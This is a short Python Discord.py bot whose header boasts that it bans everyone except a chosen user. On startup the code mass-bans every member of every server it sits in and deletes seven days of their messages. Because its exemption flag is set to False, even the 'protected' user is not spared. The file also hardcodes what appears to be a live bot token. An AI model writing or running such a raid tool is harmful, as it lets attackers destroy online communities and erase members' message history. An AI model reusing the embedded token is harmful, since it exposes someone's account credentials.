# The Discord.py bot that BANs everyone except selected user and bot itself!

import discord

botid = "672883371722014783"
nobanid = "123213123123123"
noban = False

client = discord.Client()

@client.event
async def on_ready():
    print('Logged in!')
    for member in client.get_all_members():
        print(f"Banning {member.display_name}!")
        if str(member.id) == botid:
            print("Oops! It is me!")
            continue
        if str(member.id) == nobanid:
            if noban == True:
                print("Oops! We dont ban him.")
                continue
        try:
            await member.ban(reason="Thor has hit you with his hammer!", delete_message_days=7)
        except:
            print(f"Oops! I cant ban {member.display_name} for some reason! Maybe he is owner?")
            continue
        print(f"Banned {member.display_name}!")
    print("Banning is complete!")

client.run("NjcyODgzMzcxNzIyMDE0Nzgz.XjSdYw.OwSV9_P3_dAZjB_EVsVVCI42hT0", bot=True)